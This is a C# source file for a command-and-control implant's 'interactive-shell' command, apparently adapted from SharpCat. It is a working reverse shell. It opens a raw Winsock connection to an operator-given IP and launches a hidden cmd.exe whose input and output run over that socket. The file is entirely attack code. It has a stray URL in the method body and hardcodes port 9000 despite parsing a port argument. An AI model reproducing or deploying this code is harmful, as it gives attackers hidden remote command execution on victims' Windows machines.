using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;
using Agent.Models;
using System;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;

namespace Agent.Commands
{
    public class InteractiveShell : AgentCommand
    {
        public override string Name => "interactive-shell";

        public override string Execute(AgentTask task)
        {
            https://github.com/Cn33liz/SharpCat/blob/master/SharpCat.cs
            // use debugger
            var ip = task.Args[0];
            FieldInfo m_Buffer;
            if (!int.TryParse(task.Args[1], out var port))
                return "Failed to parse port at start";
            Console.WriteLine(port);
            var wsaData = new Native.Ws2_32.WSAData();
            if (Native.Ws2_32.WSAStartup(0x0202, out wsaData) != 0) return "Failed at wsa startup";

            m_Buffer = typeof(SocketAddress).GetField("m_Buffer", (BindingFlags.Instance | BindingFlags.NonPublic));
            IPAddress address;
            if (!IPAddress.TryParse(ip, out address)) return "Failed to parse ip address";
            //if (!((port >= 0) && (port <= 0xffff))) return "failed to parse port";
            Console.WriteLine(IPEndPoint.MaxPort);
            var remoteEP = new IPEndPoint(address, 9000);
            SocketAddress socketAddress = remoteEP.Serialize();

            IntPtr m_Handle = Native.Ws2_32.WSASocket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp, IntPtr.Zero, 0, 0);
            if (m_Handle == new IntPtr(-1)) return "Failed to create wsa socket";

            new SocketPermission(NetworkAccess.Connect, TransportType.Tcp, remoteEP.Address.ToString(), remoteEP.Port).Demand();

            var buf = (byte[])m_Buffer.GetValue(socketAddress);

            var result = (Native.Ws2_32.WSAConnect(m_Handle, buf, socketAddress.Size, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero) == 0);


            var startupInfo = new Native.Kernel32.STARTUPINFO();
            startupInfo.cb = Marshal.SizeOf(startupInfo);
            startupInfo.lpReserved = null;
            startupInfo.dwFlags = (0x00000001 | 0x00000100); //(STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
            startupInfo.hStdInput = m_Handle;
            startupInfo.hStdOutput = m_Handle;
            startupInfo.hStdError = m_Handle;
            if (!Native.Kernel32.CreateProcess(@"C:\Windows\system32\cmd.exe", null, IntPtr.Zero, IntPtr.Zero, false, 0x08000000 , IntPtr.Zero, @"C:\windows\system32", ref startupInfo, out var pi))
                return "Failed to create process";
            return "Created interactive shell";

        }
    }
}
